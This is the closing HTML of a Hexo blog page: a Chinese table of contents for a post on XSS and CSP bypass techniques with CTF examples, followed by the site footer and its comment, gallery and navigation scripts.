href="#meta%E6%A0%87%E7%AD%BE%E8%B7%B3%E8%BD%AC"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">meta标签跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#script%E8%84%9A%E6%9C%AC%E8%B7%B3%E8%BD%AC"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">script脚本跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#prefetch%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">prefetch预加载绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-XSS%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">2.3.</span> <span class="toc-text">0x03 XSS绕过技巧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%AE%9E%E4%BE%8B%E8%A7%A3%E6%9E%90"><span class="toc-number">2.4.</span> <span class="toc-text">0x04 实例解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-htcf-guestbook"><span class="toc-number">2.4.1.</span> <span class="toc-text">0x1 htcf guestbook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%B7%B3%E8%BD%AC%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">1.跳转绕过：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-chrome%E5%AF%B9CSP%E6%94%AF%E6%8C%81%E7%9A%84%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%BB%95%E8%BF%87-%E9%A2%84%E5%8A%A0%E8%BD%BD%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">2.chrome对CSP支持的不完整绕过 预加载绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-0ctf-simplexss"><span class="toc-number">2.5.</span> <span class="toc-text">0x05 0ctf simplexss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-%E5%B8%B8%E8%A7%81%E6%A0%87%E7%AD%BE%E5%8F%8A%E5%B1%9E%E6%80%A7"><span class="toc-number">2.5.1.</span> <span class="toc-text">5.1 常见标签及属性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scirpt-%E6%A0%87%E7%AD%BE"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">scirpt 标签</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.5.2.</span> <span class="toc-text">漏洞验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">1、漏洞验证的相关概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">2、漏洞验证相关概念之间的区别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84POC"><span class="toc-number">2.5.2.3.</span> <span class="toc-text">3、常见的POC</span></a></li></ol></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>